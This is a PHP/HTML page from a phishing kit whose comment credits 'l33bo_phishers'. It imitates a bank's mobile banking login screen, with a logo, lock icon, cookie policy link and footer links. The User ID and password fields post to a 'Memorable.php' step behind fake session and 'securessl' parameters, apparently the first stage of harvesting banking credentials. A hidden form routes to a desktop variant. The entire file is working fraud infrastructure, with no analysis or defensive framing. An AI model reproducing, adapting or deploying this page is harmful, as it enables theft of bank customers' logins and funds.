<?php
/*
Created by l33bo_phishers -- icq: 695059760 
*/
session_start();
require "../../assets/includes/functions.php";
require "../../assets/includes/simplehtmldom.php";
require "../../assets/includes/enc.php";
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML Basic 1.1//EN" "http://www.w3.org/TR/xhtml-basic/xhtml-basic11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-gb">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Login</title>
<meta http-equiv="content-language" content="en-gb">
<link rel="alternate" media="handheld" href="">
<meta name="viewport" content="width=device-width">
<link rel="shortcut icon" href="assets/img/favicon.ico" type="image/icon"> 
<link rel="icon" href="assets/img/favicon.ico" type="image/icon">
<link rel="apple-touch-icon" sizes="57x57" href="assets/img/57x57.jpg">
<link rel="apple-touch-icon" sizes="114x114" href="assets/img/114x114.jpg">
<link type="text/css" href="assets/css/mobile.css" rel="stylesheet">
<script type="text/javascript">
function DntWantMobile() {
if(document.getElementById('GTF').clicked == true)
{
   alert("button was clicked");
   document.DntWantMobile.submit();
}
}
</script>
</head>
<div style="display:none">
<form action="../Loginmb.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true" method="POST" id="DntWantMobile" name="DntWantMobile"> 
</form>
</div>
<body class="hasJS">
    
    
    <div id="outer">
        <div id="banner">
            
            <p id="logo">
                <img src="assets/img/official.gif">
            </p>
            
            
            <p id="userstatusNGB">
                <img src="assets/img/lock.png">
            </p>
            
            
            
            <p class="cookiePolicy">
                
                <a id="lnkePrivacy" name="lnkePrivacy" href="#">Cookie policy </a>
            </p>
            
            <div class="clearer"></div>
        </div>
        <div id="header">
            <div class="panelTL">
                <div class="panelTR">
                    <div class="panelBR">
                        <div class="panelBL">
                            <div id="headerInner">
                                
      


		<h1>Welcome to&nbsp;Mobile Banking</h1>



<!-- end TS:component_0_free_format -->
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="content">
            <div class="login">
                <div class="panelTL">
                    <div class="panelTR">
                        <div class="panelBR">
                            <div class="panelBL">
                                <div class="loginInner">
                                    
                                    
                                    <div class="loginFields">
                                        <form id="frmLogin" name="frmLogin" method="post" action="Memorable.php?&sessionid=<?php echo generateRandomString(30); ?>&securessl=true" autocomplete="off">

	<div class="formField">
                                                <label for="frmLogin:lblUserID">User ID</label> <input type="text" required autocomplete="off" id="frmLogin:strCustomerLogin_userID" name="user" class="wide" maxlength="30" value="">
                                            </div>


                                            <div class="formField">
                                                <label for="frmLogin:lblPassword">Password</label> <input type="password" required autocomplete="off" id="frmLogin:strCustomerLogin_pwd" name="pass" class="wide" maxlength="20" value="">
                                            </div>
                                            <div class="formField">
                                                
                                                <input class="checkbox" type="checkbox" name="frmLogin:loginRemember">
                                                <label class="checkboxLabel" for="frmLogin:loginRemember">
                                                    <a id="rememberMe" name="rememberMe" href="#">Remember my User ID
                                                </a>
                                                </label>
                                            </div>
                                            <div class="actionsLogin">
                                                <div class="divider">
                                                    <hr>
                                                </div>
                                                
                                                <input id="frmLogin:lnkLogin1" name="frmLogin:lnkLogin1" type="submit" value="Continue" text="Continue" class="submitAction">
                                            </div>
                                            
                                            
                                        </form>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            
      
      <div class="aside">
          <p class="sideNote">
            
            
            <a id="lnkForgotUserID" name="lnkForgotUserID" href="#">Forgotten your User ID?
            </a>
            
            
            <br><br>
            
            
            <a id="lnkForgotPwdMI" name="lnkForgotPwdMI" href="#">Forgotten your password?
            </a>
            
          </p>
          </div>
          
      

            

            <div class="appBannerBG">
                <div class="appBannerLink">
                    <p align="center"><a class="newwin" href="#" title=""><img src="assets/img/ad1.gif"></a></p>
                </div>
            </div>
            <div class="clearer"></div>
            
            

            <div id="footerLogin">
                <div class="FootNav">
                    <div class="lnkLevFoot">
                        <p class="lnkLevFootP">
                            
                            <a id="lnk1" name="lnk1" href="#" class="blockLink"> Register for Internet Banking
                            </a>
                        </p>
                    </div>
                    <div class="lnkLevFoot">
                        <p class="lnkLevFootP">
                            
                            <a id="GTF" name="GTF" href="#" onclick="DntWantMobile();" class="blockLink"> Go to desktop site</a>
                        </p>
                    </div>
                    <div class="lnkLevFoot">
                        <p class="lnkLevFootP">
                            
                            <a id="lnk2" name="lnk2" href="#" class="blockLink"> Help
                            </a>
                        </p>
                    </div>
                    <div class="lnkLevFoot">
                        
                        <p class="lnkLevFootP">
                            <a id="lnk3" name="lnk3" href="#" class="blockLink"> Security
                            </a>
                        </p>
                    </div>
                    <div class="lnkLevFoot">
                        <p class="lnkLevFootP">
                            
                            <a id="lnk4" name="lnk4" href="#" class="blockLink"> Contact us
                            </a>
                        </p>
                    </div>
                </div>
            </div>
            <div class="aside">
                <p class="sideNote">
                    
                    <a id="lnkBookmark" name="lnkBookmark" href="#">Find out how to bookmark this screen
                    </a>
                </p>
                
                
            </div>
            <div class="appBannerBG">
                <div class="appBannerLink"><p><a href="#"><img alt="fscs tile" src="assets/img/ad2.jpg"></a></p>
                </div>
            </div>
            <div class="clearer"></div>
            <div>
                

                <div class="footerLinksLogin">
                    
                    <a id="unauth:lnksecurity" name="unauth:lnksecurity" href="#">Security
                    </a> 
                    
                    <a id="unauth:lnkLegal" class="footerLinksLast" name="unauth:lnkLegal" href="#">Legal
                    </a>
                </div>
            </div>
        </div>
    </div>

    







<script type="text/javascript" src="assets/js/global_2.js"></script>

	

    


</body>
</html>